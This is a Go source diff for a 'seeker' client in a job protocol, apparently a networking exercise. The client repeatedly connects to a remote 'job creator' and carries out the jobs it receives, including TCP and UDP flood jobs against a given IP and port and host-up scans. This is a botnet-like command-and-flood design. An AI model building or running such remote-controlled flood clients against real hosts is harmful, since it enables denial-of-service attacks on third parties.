@@ -5,7 +5,6 @@ import (
 	"bytes"
 	"fmt"
 	"net"
-	"os"
 	"strconv"
 	"strings"
 
@@ -15,119 +14,151 @@ import (
 	jobs "github.com/prairir/JobProtocol/Jobs"
 )
 
-func main() {
+// Seeker is a connection loop to any creator, handling jobs. Calling with main in a loop.
+func Seeker() {
 	// set timeout and connection
-	conn, err := net.Dial(globals.ConnType, fmt.Sprint(globals.ConnAddr, ":", globals.ConnPort))
-	fatalErrorCheck(err)
+	fmt.Println("waiting for job creator...")
+	var conn net.Conn
+	for {
+		temp, err := net.Dial(globals.ConnType, fmt.Sprint(globals.ConnAddr, ":", globals.ConnPort))
+		if err == nil {
+			conn = temp
+			break
+		}
+	}
+	defer conn.Close()
+	fmt.Println("Found job creator!")
 
 	// state
 	// 0 initial connection
-	// 1 waiting for HELLOACK
-	// 2 first JOB EQN
-	// 3 accepted and waiting for second JOB EQN
-	// 4 closed
+	// 1 received HELLOACK, waiting for JOB
+	// 2 accepted first JOB EQN and waiting for second JOB EQN
+	// 3 done job
 	state := 0
 	// send HELLO at initial connection
 	fmt.Fprintln(conn, "HELLO")
 	fmt.Println("sent HELLO")
-	state = 1
 	for {
 		fmt.Println("waiting for creator...")
 		result, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
+			fmt.Println("Could not read connection. Connection is probably down. Start over. ")
 			break
 		}
 		cleanedResult := strings.TrimSpace(string(result))
 		fmt.Println("received:", cleanedResult, "state:", state)
 
-		if state == 1 && cleanedResult == "HELLOACK" {
-			state = 2
-		} else if state == 2 && cleanedResult == "JOB EQN" {
-			conn.Write([]byte("ACPT JOB EQN\r\n"))
-			fmt.Println("accept:", result)
-			state = 3
-		} else if state == 2 && cleanedResult == "JOB TCPFLOOD" {
-			conn.Write([]byte("ACPT JOB TCPFLOOD\r\n"))
-			fmt.Println("accept:", result)
-			state = 3
-		} else if state == 2 && cleanedResult == "JOB HOSTUP" {
-			conn.Write([]byte("ACPT JOB HOSTUP\r\n"))
-			fmt.Println("accept:", result)
-			state = 3
-		} else if state == 2 && cleanedResult == "JOB UDPFLOOD" {
-			conn.Write([]byte("ACPT JOB UDPFLOOD\r\n"))
-			fmt.Println("received:", result)
-			state = 3
-		} else if state == 3 && cleanedResult[:7] == "JOB EQN" {
-			fmt.Println("[", cleanedResult[8:], "]")
-			expression, err := govaluate.NewEvaluableExpression(cleanedResult[8:])
-			if err != nil {
-				fmt.Println("job failed... bad input?", err.Error())
-				conn.Write([]byte("JOB FAIL\r\n"))
-			}
-			expResult, err := expression.Evaluate(nil)
-			if err != nil {
-				fmt.Println("job failed... bad input?", err.Error())
-				conn.Write([]byte("JOB FAIL\r\n"))
-			} else {
-				conn.Write([]byte("JOB SUCC " + fmt.Sprint(expResult) + "\r\n"))
-			}
-			state = 4
-		} else if state == 3 && cleanedResult[:12] == "JOB TCPFLOOD" {
-			// splits after JOB TCPFLOOD
-			// eg JOBTCPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
-			splits := strings.Split(cleanedResult[:13], " ")
-			port, _ := strconv.Atoi(splits[1])
+		queryStr, err := globals.GetHeader(cleanedResult)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprint("DENY JOB\r\n")))
+			fmt.Println("denying job due to error", err)
+			state = 1
+			continue
+		}
+		fmt.Println("q:", queryStr)
 
-			jobs.TCPFlood(splits[0], port)
-
-			conn.Write([]byte("JOB SUCC \r\n"))
-			state = 4
-		} else if state == 3 && cleanedResult[:10] == "JOB HOSTUP" {
-			hosts := strings.Split(cleanedResult[11:], " ")
-			fmt.Println(hosts)
-			var buf bytes.Buffer
-			for _, host := range hosts {
-				online, offline, err := jobs.HostUp(host, &buf)
-				if err != nil {
-					if err.Error() != "timeout" {
-						conn.Write([]byte("JOB FAIL"))
-						break
-					}
-				}
-				conn.Write([]byte("JOB SUCC ONLINE "))
-				for _, ip := range online {
-					conn.Write([]byte(fmt.Sprint(ip, ", ")))
-				}
-				conn.Write([]byte("OFFLINE "))
-				for _, ip := range offline {
-					conn.Write([]byte(fmt.Sprint(ip, ", ")))
-				}
-				conn.Write([]byte("\r\n"))
+		if state == 0 {
+			if cleanedResult == "HELLOACK" {
+				state = 1
+			}
+			continue
+		} else if state == 1 {
+			switch queryStr {
+			case "JOB EQN":
+				fallthrough
+			case "JOB TCPFLOOD":
+				fallthrough
+			case "JOB HOSTUP":
+				fallthrough
+			case "JOB UDPFLOOD":
+				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
+				fmt.Println("accept:", result)
 				break
 			}
-		} else if state == 3 && cleanedResult[:12] == "JOB UDPFLOOD" {
-			// splits after JOB UDPFLOOD
-			// eg JOB UDPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
-			splits := strings.Split(cleanedResult[:13], " ")
-			port, _ := strconv.Atoi(splits[1])
-
-			jobs.UDPFlood(splits[0], port)
-
-			conn.Write([]byte("JOB SUCC \r\n"))
-			state = 4
-		}
-		if state == 4 {
 			state = 2
+			continue
+		} else if state == 2 {
+			data := cleanedResult[len(queryStr)+1:]
+			fmt.Println("[", data, "]")
+			switch queryStr {
+			case "JOB EQN":
+				expression, err := govaluate.NewEvaluableExpression(data)
+				if err != nil {
+					fmt.Println("job failed... bad input?", err.Error())
+					conn.Write([]byte("JOB FAIL\r\n"))
+					state = 2
+					break
+				}
+				expResult, err := expression.Evaluate(nil)
+				if err != nil {
+					fmt.Println("job failed... bad input?", err.Error())
+					conn.Write([]byte("JOB FAIL\r\n"))
+				} else {
+					fmt.Println("successful job! Result:", expResult)
+					conn.Write([]byte("JOB SUCC " + fmt.Sprint(expResult) + "\r\n"))
+				}
+				break
+			case "JOB TCPFLOOD":
+				// splits after JOB TCPFLOOD
+				// eg JOBTCPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
+				splits := strings.Split(cleanedResult[:13], " ")
+				port, _ := strconv.Atoi(splits[1])
+
+				jobs.TCPFlood(splits[0], port)
+
+				conn.Write([]byte("JOB SUCC \r\n"))
+				break
+			case "JOB HOSTUP":
+				hosts := strings.Split(cleanedResult[11:], " ")
+				fmt.Println(hosts)
+				var buf bytes.Buffer
+				for _, host := range hosts {
+					online, offline, err := jobs.HostUp(host, &buf)
+					if err != nil {
+						if err.Error() != "timeout" {
+							conn.Write([]byte("JOB FAIL"))
+							break
+						}
+					}
+					fmt.Println("buffer: ", buf)
+					conn.Write([]byte("JOB SUCC ONLINE "))
+					for _, ip := range online {
+						conn.Write([]byte(fmt.Sprint(ip, ", ")))
+					}
+					conn.Write([]byte("OFFLINE "))
+					for _, ip := range offline {
+						conn.Write([]byte(fmt.Sprint(ip, ", ")))
+					}
+					conn.Write([]byte("\r\n"))
+					break
+				}
+				break
+			case "JOB UDPFLOOD":
+				// splits after JOB UDPFLOOD
+				// eg JOB UDPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
+				splits := strings.Split(cleanedResult[:13], " ")
+				port, _ := strconv.Atoi(splits[1])
+
+				jobs.UDPFlood(splits[0], port)
+
+				conn.Write([]byte("JOB SUCC \r\n"))
+				break
+			}
+			state = 1
 			continue
 		}
 	}
-	conn.Close()
 }
 
-func fatalErrorCheck(err error) {
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
-		os.Exit(1)
+func main() {
+	i := 0
+	re := ""
+	for {
+		fmt.Print(re, "starting seeker loop. Press Ctrl+C to exit. \n")
+		Seeker()
+		if i == 0 {
+			re = "re"
+			i++
+		}
 	}
 }
